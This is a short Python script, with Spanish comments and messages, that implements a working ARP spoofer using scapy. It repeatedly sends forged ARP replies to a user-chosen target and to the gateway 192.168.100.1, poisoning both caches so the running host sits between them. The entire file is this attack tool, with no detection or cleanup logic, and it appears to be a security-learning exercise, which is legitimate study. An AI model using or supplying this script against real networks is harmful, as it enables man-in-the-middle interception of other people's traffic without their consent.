#!/usr/bin/env python3

import argparse
import scapy.all as scapy
import time
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to Spoof")
    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    target_mac = scapy.getmacbyip(ip_address) # pyright: ignore
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66", hwdst=target_mac) # pyright: ignore

    # Envolvemos en Ether() → esto elimina el WARNING
    ether_packet = scapy.Ether(dst=target_mac) / arp_packet # pyright: ignore
    # ahora toca enviar este paquete a nivel de red (solo enviar, no recibir)
    scapy.sendp(ether_packet, verbose=False)

def main():
    arguments = get_arguments()
    print(colored(f"[+] Iniciando spoof hacia {arguments.ip_address} ...", 'green'))
    while True: 
        spoof(arguments.ip_address, "192.168.100.1") 
        spoof("192.168.100.1", arguments.ip_address)

        time.sleep(2)

if __name__ == "__main__":
    main()
